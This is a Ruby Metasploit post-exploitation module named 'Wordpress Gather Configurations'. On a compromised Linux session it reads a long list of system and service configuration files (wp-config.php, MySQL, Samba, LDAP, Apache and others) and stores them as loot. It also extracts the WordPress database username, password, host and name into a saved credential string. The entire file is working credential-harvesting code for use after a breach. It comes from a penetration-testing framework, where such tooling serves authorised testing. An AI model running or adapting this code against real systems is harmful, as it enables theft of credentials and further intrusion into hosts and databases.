##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Linux::System

  def initialize(info = {})
    super( update_info( info,
      'Name'          => 'Wordpress Gather Configurations',
      'Description'   => %q{
        This module collects configuration files for Wordpress.
        If a config file is found it is parsed and credentials
        exfiltrated.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'ohdae <bindshell[at]live.com>',
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end


  def run
    distro = get_sysinfo

    print_status "Running module against #{session.session_host} [#{get_hostname}]"
    print_status 'Info:'
    print_status "\t#{distro[:version]}"
    print_status "\t#{distro[:kernel]}"

    vprint_status 'Finding configuration files...'
    find_configs
  end


  def save(file, data, ctype='text/plain')
    ltype = 'linux.enum.conf'
    fname = ::File.basename(file)
    loot = store_loot(ltype, ctype, session, data, fname)
    print_good("#{fname} stored in #{loot}")
    if fname.eql? "wp-config.php"
      print_good("    Storing Wordpress database credentials")
      db_password = data.scan(/define\('DB_PASSWORD', '(.+)'\)/)[0][0]
      db_user = data.scan(/define\('DB_USER', '(.+)'\)/)[0][0]
      db_host = data.scan(/define\('DB_HOST', '(.+)'\)/)[0][0]
      if db_host.include? ':'
        db_host_name = db_host.split(':')[0]
        db_host_port = db_host.split(':')[-1]
      else
        db_host_name = db_host
      end
      db_name = data.scan(/define\('DB_NAME', '(.+)'\)/)[0][0]
      conn_string = "#{db_user}:#{db_password}@#{db_host_name}:#{db_host_port}/#{db_name}"
      print_good("    #{db_user}:#{db_password}@#{db_host_name}:#{db_host_port}/#{db_name}")
      loot = store_loot('db.mysql.cred', ctype, db_host_name, conn_string, fname, conn_string, 'mysql')
    end
  end

  def find_configs
    configs = [
     "/var/www/html/wp-config.php",
     "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
     "/etc/snort/snort.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf",
     "/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
     "/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/security/access.conf",
     "/etc/gated.conf", "/etc/rpc", "/etc/psad/psad.conf", "/etc/mysql/debian.cnf",
     "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf",
     "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/openldap.conf",
     "/etc/cups/cups.conf", "/etc/opt/lampp/etc/httpd.conf", "/etc/sysctl.conf",
     "/etc/proxychains.conf", "/etc/cups/snmp.conf", "/etc/mail/sendmail.conf",
     "/etc/snmp/snmp.conf"
    ]
    # configs = [
    #   "/var/www/html/wp-config.php"
    # ]

    configs.each do |f|
      output = read_file(f).to_s
      next if output.strip.length == 0
      next if output =~ /No such file or directory/
      save(f, output)
    end
  end
end
